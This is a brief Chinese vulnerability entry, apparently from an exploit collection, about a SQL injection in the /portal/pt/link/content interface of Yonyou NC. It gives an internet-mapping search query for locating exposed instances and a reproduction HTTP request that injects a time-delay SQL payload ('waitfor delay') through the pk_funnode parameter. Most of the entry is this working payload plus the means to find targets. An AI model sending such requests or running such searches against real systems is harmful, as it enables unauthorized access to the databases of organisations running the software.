0x01 漏洞名称

用友NC/link/content-SQL注入

0x02 漏洞介绍

用友NC/link/content接口存在SQL注入，攻击者可以通过此接口进行执行sql命令。

0x03 影响范围

浪用友NC

0x04 网络空间测绘查询

product="用友-UFIDA-NC" && icon_hash="1085941792"

0x05 漏洞复现

```yaml
GET /portal/pt/link/content?pageId=login&pk_funnode=1'waitfor+delay+'0:0:6'-- HTTP/1.1Host: 11.11.11.11User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1Connection: closeAccept-Encoding: gzip, deflate
```

